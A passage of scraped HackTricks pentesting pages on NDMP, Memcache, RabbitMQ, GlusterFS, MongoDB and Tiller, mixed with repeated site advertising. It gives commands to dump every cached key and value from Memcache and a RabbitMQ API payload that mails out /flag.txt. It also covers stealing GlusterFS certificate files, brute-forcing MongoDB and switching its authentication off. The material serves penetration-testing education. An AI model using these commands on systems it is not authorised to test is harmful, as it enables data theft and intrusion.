the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)\nNext\n- Network Services Pentesting\n10000 - Pentesting Network Data Management Protocol (ndmp)\nLast modified\n6mo ago"
    },
    {
        "title": "10000 - Pentesting Network Data Management Protocol (ndmp)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/10000-network-data-management-protocol-ndmp",
        "text": "10000 - Pentesting Network Data Management Protocol (ndmp)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nProtocol Information\nNDMP\n, or\nNetwork Data Management Protocol\n, is a protocol meant to transport data between network attached storage (\nNAS\n) devices and\nbackup\ndevices. This removes the need for transporting the data through the backup server itself, thus enhancing speed and removing load from the backup server.\nFrom\nWikipedia\n.\nDefault port:\n10000\nPORT      STATE SERVICE REASON  VERSION\n10000/tcp open  ndmp    syn-ack Symantec/Veritas Backup Exec ndmp\nEnumeration\nnmap\n-n\n-sV\n--script\n\"ndmp-fs-info or ndmp-version\"\n-p\n10000\n<\nIP\n>\n#Both are default scripts\nShodan\nndmp\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n9200 - Pentesting Elasticsearch\nNext\n- Network Services Pentesting\n11211 - Pentesting Memcache\nLast modified\n6mo ago"
    },
    {
        "title": "11211 - Pentesting Memcache",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/11211-memcache",
        "text": "11211 - Pentesting Memcache\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nProtocol Information\nMemcached\n(pronunciation: mem-cashed, mem-cash-dee) is a general-purpose distributed\nmemory caching\nsystem. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read. (From\nwikipedia\n)\nAlthough Memcached supports SASL, most instances are\nexposed without authentication\n.\nDefault port:\n11211\nPORT      STATE SERVICE\n11211/tcp open  unknown\nEnumeration\nManual\nTo ex-filtrate all the information saved inside a memcache instance you need to:\n1.\nFind\nslabs\nwith\nactive items\n2.\nGet the\nkey names\nof the slabs detected before\n3.\nEx-filtrate the\nsaved data\nby\ngetting the key names\nRemember that this service is just a\ncache\n, so\ndata may be appearing and disappearing\n.\necho\n\"version\"\n|\nnc\n-vn\n-w\n1\n<\nIP\n>\n11211\n#Get version\necho\n\"stats\"\n|\nnc\n-vn\n-w\n1\n<\nIP\n>\n11211\n#Get status\necho\n\"stats slabs\"\n|\nnc\n-vn\n-w\n1\n<\nIP\n>\n11211\n#Get slabs\necho\n\"stats items\"\n|\nnc\n-vn\n-w\n1\n<\nIP\n>\n11211\n#Get items of slabs with info\necho\n\"stats cachedump <number> 0\"\n|\nnc\n-vn\n-w\n1\n<\nIP\n>\n11211\n#Get key names (the 0 is for unlimited output size)\necho\n\"get <item_name>\"\n|\nnc\n-vn\n-w\n1\n<\nIP\n>\n11211\n#Get saved info\n‚Äã\n#This php will just dump the keys, you need to use \"get <item_name> later\"\nsudo\napt-get\ninstall\nphp-memcached\nphp\n-r\n'$c = new Memcached(); $c->addServer(\"localhost\", 11211); var_dump( $c->getAllKeys() );'\nManual2\nsudo\napt\ninstall\nlibmemcached-tools\nmemcstat\n--servers\n=\n127.0\n.0.1\n#Get stats\nmemcdump\n--servers\n=\n127.0\n.0.1\n#Get all items\nmemccat\n--servers\n=\n127.0\n.0.1\n<\nitem\n1\n>\n<\nitem\n2\n>\n<\nitem\n3\n>\n#Get info inside the item(s)\nAutomatic\nnmap\n-n\n-sV\n--script\nmemcached-info\n-p\n11211\n<\nIP\n>\n#Just gather info\nmsf\n>\nuse auxiliary/gather/memcached_extractor\n#Extracts saved data\nmsf\n>\nuse auxiliary/scanner/memcached/memcached_amp\n#Check is UDP DDoS amplification attack is possible\nDumping Memcache Keys\nIf your memcached version is above 1.4.31, read next section for advanced method of dumping keys.\nThe memcache protocol provides\ncommands\nto peek into the data that is organized by slabs (categories of data of a given size range). There are some significant limitations though:\n1.\nYou can only dump keys per slab class (keys with roughly the same content size)\n2.\nYou can only dump one page per slab class (1MB of data)\n3.\nThis is an unofficial feature that\nmight be removed anytime.\n‚Äã\nThe second limitation is probably the hardest because 1MB of several gigabytes is almost nothing. Still it can be useful to watch how you use a subset of your keys. But this might depend on your use case. If you don‚Äôt care about the technical details just skip to the\ntools section\nto learn about what tools allow you to easily dump everything. Alternatively follow the following guide and try the commands\nusing telnet\nagainst your memcached setup.\nHow it Works\nFirst you need to know how memcache organizes its memory. If you start memcache with option ‚Äú-vv‚Äù you see the slab classes it creates. For example\n$ memcached -vv\nslab class   1: chunk size        96 perslab   10922\nslab class   2: chunk size       120 perslab    8738\nslab class   3: chunk size       152 perslab    6898\nslab class   4: chunk size       192 perslab    5461\n[...]\nIn the configuration printed above memcache will keep fit 6898 pieces of data between 121 and 152 byte in a single slab of 1MB size (6898*152). All slabs are sized as 1MB per default. Use the following command to print all currently existing slabs:\nstats slabs\nIf you‚Äôve added a single key to an empty memcached 1.4.13 with\nset mykey 0 60 1\n1\nSTORED\nyou‚Äôll now see the following result for the ‚Äústats slabs‚Äù command:\nstats slabs\nSTAT 1:chunk_size 96\nSTAT 1:chunks_per_page 10922\nSTAT 1:total_pages 1\nSTAT 1:total_chunks 10922\nSTAT 1:used_chunks 1\nSTAT 1:free_chunks 0\nSTAT 1:free_chunks_end 10921\nSTAT 1:mem_requested 71\nSTAT 1:get_hits 0\nSTAT 1:cmd_set 2\nSTAT 1:delete_hits 0\nSTAT 1:incr_hits 0\nSTAT 1:decr_hits 0\nSTAT 1:cas_hits 0\nSTAT 1:cas_badval 0\nSTAT 1:touch_hits 0\nSTAT active_slabs 1\nSTAT total_malloced 1048512\nEND\nThe example shows that we have only one active slab type #1. Our key being just one byte large fits into this as the smallest possible chunk size. The slab statistics show that currently on one page of the slab class exists and that only one chunk is used.\nMost importantly it shows a counter for each write operation (set, incr, decr, cas, touch) and one for gets. Using those you can determine a hit ratio!\nYou can also fetch another set of infos using ‚Äústats items‚Äù with interesting counters concerning evictions and out of memory counters.\nstats items\nSTAT items:1:number 1\nSTAT items:1:age 4\nSTAT items:1:evicted 0\nSTAT items:1:evicted_nonzero 0\nSTAT items:1:evicted_time 0\nSTAT items:1:outofmemory 0\nSTAT items:1:tailrepairs 0\nSTAT items:1:reclaimed 0\nSTAT items:1:expired_unfetched 0\nSTAT items:1:evicted_unfetched 0\nEND\nWhat We Can Guess Already‚Ä¶\nGiven the statistics infos per slabs class we can already guess a lot of thing about the application behaviour:\n1.\nHow is the cache ratio for different content sizes?\nHow good is the caching of large HTML chunks?\n2.\nHow much memory do we spend on different content sizes?\nHow much do we spend on simple numeric counters?\nHow much do we spend on our session data?\nHow much do we spend on large HTML chunks?\n3.\nHow many large objects can we cache at all?\nOf course to answer the questions you need to know about the cache objects of your application.\nNow: How to Dump Keys?\nKeys can be dumped per slabs class using the ‚Äústats cachedump‚Äù command.\nstats cachedump <slab class> <number of items to dump>\nTo dump our single key in class #1 run\nstats cachedump 1 1000\nITEM mykey [1 b; 1350677968 s]\nEND\nThe ‚Äúcachedump‚Äù returns one item per line. The first number in the braces gives the size in bytes, the second the timestamp of the creation. Given the key name you can now also dump its value using\nget mykey\nVALUE mykey 0 1\n1\nEND\nThis is it: iterate over all slabs classes you want, extract the key names and if need dump there contents.\nDUMPING MEMCACHE KEYS (VER 1.4.31+)\nIn memcache version 1.4.31 and above there is a new command for dumping memory keys in non-blocking mode (read https://github.com/memcached/memcached/wiki/ReleaseNotes1431 ). This method is safe to run in production. The output is not consistent, but good enough for finding keys, their exact expiration time (EXP) and last accessed time (LA). Because of huge output generated, it‚Äôs recommended to use ‚Äònc‚Äô command. Examples:\necho 'lru_crawler metadump all' | nc 127.0.0.1 11211 | head -1\nkey=0dLLX%253Amemcache_test_key exp=1590718787 la=1590718487 cas=2238881166 fetch=yes\n‚Äã\necho 'lru_crawler metadump all' | nc 127.0.0.1 11211 | grep ee6ba58566e234ccbbce13f9a24f9a28\nkey=VQRFX%253Aee6ba58566e234ccbbce13f9a24f9a28 exp=-1 la=1590386157 cas=1776204003 fetch=yes\nkey=0dLLX%253Aee6ba58566e234ccbbce13f9a24f9a28 exp=-1 la=1590712292 cas=2225524871 fetch=yes\nEXP=-1 means the item never expires EXP=1590718787 (Fri May 29 02:19:47 GMT 2020) keeps the unix timestamp when the item should expire LA=1590712292 (Mon May 25 05:55:57 GMT 2020) keeps the unix timestamp when the item was last accessed\nDUMPING TOOLS\nThere are different dumping tools sometimes just scripts out there that help you with printing memcache keys:\nProgramming Languages\nTools\nFunctionality\nText\nText\nPHP\n‚Äã\nsimple script\n‚Äã\nPrints key names.\n‚Äã\n‚Äã\nPerl\n‚Äã\nsimple script\n‚Äã\nPrints keys and values\n‚Äã\n‚Äã\nRuby\n‚Äã\nsimple script\n‚Äã\nPrints key names.\n‚Äã\n‚Äã\nPerl\n‚Äã\nmemdump\n‚Äã\nTool in CPAN module\n‚Äã\nMemcached-libmemcached\n‚Äã\nached/)\nPHP\n‚Äã\nmemcache.php\n‚Äã\nMemcache Monitoring GUI that also allows dumping keys\n‚Äã\n‚Äã\nlibmemcached\n‚Äã\npeep\n‚Äã\nDoes freeze your memcached process!!!\nBe careful when using this in production. Still using it you can workaround the 1MB limitation and really dump\nall\nkeys.\n‚Äã\n‚Äã\nTroubleshooting\n1MB Data Limit\nNote that prio to memcached 1.4 you cannot store objects larger than 1MB due to the default maximum slab size.\nNever Set a Timeout > 30 Days!\nIf you try to ‚Äúset‚Äù or ‚Äúadd‚Äù a key with a timeout bigger than the allowed maximum you might not get what you expect because memcached then treats the value as a Unix timestamp. Also if the timestamp is in the past it will do nothing at all. Your command will silently fail.\nSo if you want to use the maximum lifetime specify 2592000. Example:\nset my_key 0 2592000 1\n1\nDisappearing Keys on Overflow\nDespite the documentation saying something about wrapping around 64bit overflowing a value using ‚Äúincr‚Äù causes the value to disappear. It needs to be created using ‚Äúadd‚Äù/‚Äùset‚Äù again.\nReplication\nmemcached itself does not support replication. If you really need it you need to use 3rd party solutions:\n‚Äã\nrepcached\n: Multi-master async replication (memcached 1.2 patch set)\n‚Äã\nCouchbase memcached interface\n: Use CouchBase as memcached drop-in\n‚Äã\nyrmcds\n: memcached compatible Master-Slave key value store\n‚Äã\ntwemproxy\n(aka nutcracker): proxy with memcached support\nCommands Cheat-Sheet\nMemcache Commands\nShodan\nport:11211 \"STAT pid\"\n\"STAT pid\"\nReferences\n‚Äã\nhttps://lzone.de/cheat-sheet/memcached\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n10000 - Pentesting Network Data Management Protocol (ndmp)\nNext\nMemcache Commands\nLast modified\n6mo ago"
    },
    {
        "title": "15672 - Pentesting RabbitMQ Management",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/15672-pentesting-rabbitmq-management",
        "text": "15672 - Pentesting RabbitMQ Management\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚Äã\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\nBasic Information\nYou can learn more about RabbitMQ in\n5671,5672 - Pentesting AMQP\n.\nIn this port you may find the RabbitMQ Management web console if the\nmanagement plugin\nis enabled.\nThe main page should looks like this:\nEnumeration\nThe default credentials are \"\nguest\n\":\"\nguest\n\". If they aren't working you may try to\nbrute-force the login\n.\nTo manually start this module you need to execute:\nrabbitmq-plugins enable rabbitmq_management\nservice rabbitmq-server restart\nOnce you have correctly authenticated you will see the admin console:\nAlso, if you have valid credentials you may find interesting the information of\nhttp://localhost:15672/api/connections\nNote also that it's possible to\npublish data inside a queue\nusing the API of this service with a request like:\nPOST /api/exchanges/%2F/amq.default/publish HTTP/1.1\nHost:\n172.32\n.56.72:15672\nAuthorization: Basic dGVzdDp0ZXN0\nAccept: */*\nContent-Type: application/json\n;\ncharset\n=\nUTF-8\nContent-Length:\n267\n‚Äã\n{\n\"vhost\"\n:\n\"/\"\n,\n\"name\"\n:\n\"amq.default\"\n,\n\"properties\"\n:\n{\n\"delivery_mode\"\n:1,\n\"headers\"\n:\n{}}\n,\n\"routing_key\"\n:\n\"email\"\n,\n\"delivery_mode\"\n:\n\"1\"\n,\n\"payload\"\n:\n\"{\n\\\"\nto\n\\\"\n:\n\\\"\n[email¬†protected]\n\\\"\n,\n\\\"\nattachments\n\\\"\n: [{\n\\\"\npath\n\\\"\n:\n\\\"\n/flag.txt\n\\\"\n}]}\"\n,\n\"headers\"\n:\n{}\n,\n\"props\"\n:\n{}\n,\n\"payload_encoding\"\n:\n\"string\"\n}\nShodan\nport:15672 http\n‚Äã\n‚Äã\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nMemcache Commands\nNext\n- Network Services Pentesting\n24007,24008,24009,49152 - Pentesting GlusterFS\nLast modified\n5mo ago"
    },
    {
        "title": "24007,24008,24009,49152 - Pentesting GlusterFS",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/24007-24008-24009-49152-pentesting-glusterfs",
        "text": "24007,24008,24009,49152 - Pentesting GlusterFS\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nGlusterFS\nis a\ndistributed\n, arbitrarily scalable\nfile system\nthat aggregates storage components from\nseveral servers into one\n, uniform file system.\nDefault ports\n: 24007/tcp/udp, 24008/tcp/udp, 49152/tcp (onwards)\nFor the port 49152, ports incremented by 1 need to be open to use more bricks.\nPreviously the port 24009 was used instead of 49152.\nPORT      STATE  SERVICE\n24007/tcp open   rpcbind\n49152/tcp open   ssl/unknown\nEnumeration\nTo interact with this filesystem you need to install the\nGlusterFS client\n(\nsudo apt-get install glusterfs-cli\n).\nTo list and mount the available volumes you can use:\nsudo\ngluster --remote-host\n=\n10.10\n.11.131 volume list\n# This will return the name of the volumes\n‚Äã\nsudo\nmount\n-t\nglusterfs\n10.10\n.11.131:/\n<\nvol_name\n>\n/mnt/\nIf you receive an\nerror trying to mount the filesystem\n, you can check the logs in\n/var/log/glusterfs/\nErrors mentioning certificates\ncan be fixed by stealing the files (if you have access to the system):\n/etc/ssl/glusterfs.ca\n/etc/ssl/glusterfs.key\n/etc/ssl/glusterfs.ca.pem\nAnd storing them in your machine\n/etc/ssl\nor\n/usr/lib/ssl\ndirectory (if a different directory is used check for lines similar to: \"\ncould not load our cert at /usr/lib/ssl/glusterfs.pem\n\" in the logs) .\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n15672 - Pentesting RabbitMQ Management\nNext\n- Network Services Pentesting\n27017,27018 - Pentesting MongoDB\nLast modified\n6mo ago"
    },
    {
        "title": "27017,27018 - Pentesting MongoDB",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb",
        "text": "27017,27018 - Pentesting MongoDB\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic Information\nMongoDB is an\nopen source\ndatabase management system (DBMS) that uses a document-oriented database model which supports various forms of data. (From\nhere\n)\nDefault port:\n27017, 27018\nPORT      STATE SERVICE VERSION\n27017/tcp open  mongodb MongoDB 2.6.9 2.6.9\nEnumeration\nManual\nfrom\npymongo\nimport\nMongoClient\nclient\n=\nMongoClient\n(\nhost\n,\nport\n,\nusername\n=\nusername\n,\npassword\n=\npassword\n)\nclient\n.\nserver_info\n()\n#Basic info\n#If you have admin access you can obtain more info\nadmin\n=\nclient\n.\nadmin\nadmin_info\n=\nadmin\n.\ncommand\n(\n\"serverStatus\"\n)\ncursor\n=\nclient\n.\nlist_databases\n()\nfor\ndb\nin\ncursor\n:\nprint\n(\ndb\n)\nprint\n(\nclient\n[\ndb\n[\n\"name\"\n]].\nlist_collection_names\n())\n#If admin access, you could dump the database also\nSome MongoDB commnads:\nshow dbs\nuse\n<\ndb\n>\nshow collections\ndb.\n<\ncollection\n>\n.find\n()\n#Dump the collection\ndb.\n<\ncollection\n>\n.count\n()\n#Number of records of the collection\ndb.current.find\n({\n\"username\"\n:\n\"admin\"\n})\n#Find in current db the username admin\nAutomatic\nnmap\n-sV\n--script\n\"mongo* and default\"\n-p\n27017\n<\nIP\n>\n#By default all the nmap mongo enumerate scripts are used\nShodan\nAll mongodb:\n\"mongodb server information\"\nSearch for full open mongodb servers:\n\"mongodb server information\" -\"partially enabled\"\nOnly partially enable auth:\n\"mongodb server information\" \"partially enabled\"\nLogin\nBy default mongo does not require password.\nAdmin\nis a common mongo database.\nmongo\n<\nHOST\n>\nmongo\n<\nHOST\n>\n:\n<\nPORT\n>\nmongo\n<\nHOST\n>\n:\n<\nPORT\n>\n/\n<\nDB\n>\nmongo\n<\ndatabase\n>\n-u\n<\nusername\n>\n-p\n'<password>'\nThe nmap script:\nmongodb-brute\nwill check if creds are needed.\nnmap\n-n\n-sV\n--script\nmongodb-brute\n-p\n27017\n<\nip\n>\n‚Äã\nBrute force\n‚Äã\nLook inside\n/opt/bitnami/mongodb/mongodb.conf\nto know if credentials are needed:\ngrep\n\"noauth.*true\"\n/opt/bitnami/mongodb/mongodb.conf\n|\ngrep\n-v\n\"^#\"\n#Not needed\ngrep\n\"auth.*true\"\n/opt/bitnami/mongodb/mongodb.conf\n|\ngrep\n-v\n\"^#\\|noauth\"\n#Not needed\nMongo Objectid Predict\nMongo Object IDs are\n12-byte hexadecimal\nstrings:\nFor example, here‚Äôs how we can dissect an actual Object ID returned by an application: 5f2459ac9fa6dc2500314019\n1.\n5f2459ac: 1596217772 in decimal = Friday, 31 July 2020 17:49:32\n2.\n9fa6dc: Machine Identifier\n3.\n2500: Process ID\n4.\n314019: An incremental counter\nOf the above elements, machine identifier will remain the same for as long as the database is running the same physical/virtual machine. Process ID will only change if the MongoDB process is restarted. Timestamp will be updated every second. The only challenge in guessing Object IDs by simply incrementing the counter and timestamp values, is the fact that Mongo DB generates Object IDs and assigns Object IDs at a system level.\nThe tool\nhttps://github.com/andresriancho/mongo-objectid-predict\n, given a starting Object ID (you can create an account and get a starting ID), it sends back about 1000 probable Object IDs that could have possibly been assigned to the next objects, so you just need to bruteforce them.\nPost\nIf you are root you can\nmodify\nthe\nmongodb.conf\nfile so no credentials are needed (\nnoauth = true\n) and\nlogin without credentials\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n24007,24008,24009,49152 - Pentesting GlusterFS\nNext\n- Network Services Pentesting\n44134 - Pentesting Tiller (Helm)\nLast modified\n4mo ago"
    },
    {
        "title": "44134 - Pentesting Tiller (Helm)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/44134-pentesting-tiller-helm",
        "text": "44134 - Pentesting Tiller (Helm)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nHelm is the\npackage manager\nfor Kubernetes. It allows to package YAML files and distribute them in public and private repositories. These packages are called\nHelm Charts\n.\nTiller\nis the\nservice\nrunning\nby default in the port 44134 offering the service.\nDefault port:\n44134\nPORT      STATE SERVICE VERSION\n44134/tcp open  unknown\nEnumeration\nIf you can\nenumerate pods and/or services\nof different namespaces enumerate them and search for the ones with\n\"tiller\" in their name\n:\nkubectl get pods\n|\ngrep\n-i\n\"tiller\"\nkubectl get services\n|\ngrep\n-i\n\"tiller\"\nkubectl get pods\n-n\nkube-system\n|\ngrep\n-i\n\"tiller\"\nkubectl get services\n-n\nkube-system\n|\ngrep\n-i\n\"tiller\"\nkubectl get pods\n-n\n<\nnamespace\n>\n|\ngrep\n-i\n\"tiller\"\nkubectl get services\n-n\n<\nnamespace\n>\n|\ngrep\n-i\n\"tiller\"\nExamples:\nkubectl get pods\n-n\nkube-system\nNAME                                       READY   STATUS             RESTARTS   AGE\nkube-scheduler-controlplane\n1\n/1     Running\n0\n35m\ntiller-deploy-56b574c76d-l265z\n1\n/1     Running\n0\n35m\n‚Äã\nkubectl get services\n-n\nkube-system\nNAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT\n(\nS\n)\nAGE\nkube-dns        ClusterIP\n10.96\n.0.10\n<\nnone\n>\n53\n/UDP,53/TCP,9153/TCP   35m\ntiller-deploy   ClusterIP\n10.98\n.57.159\n<\nnone\n>\n44134\n/TCP                35m\nYou could also try to find this service running checking the port 44134:\nsudo\nnmap\n-sS\n-p\n44134\n<\nIP\n>\nOnce you have discovered it you can communicate with it downloading the client helm application. You can use tools like\nhomebrew\n, or look at\nthe official releases page\n.\nFor more details, or for other options, 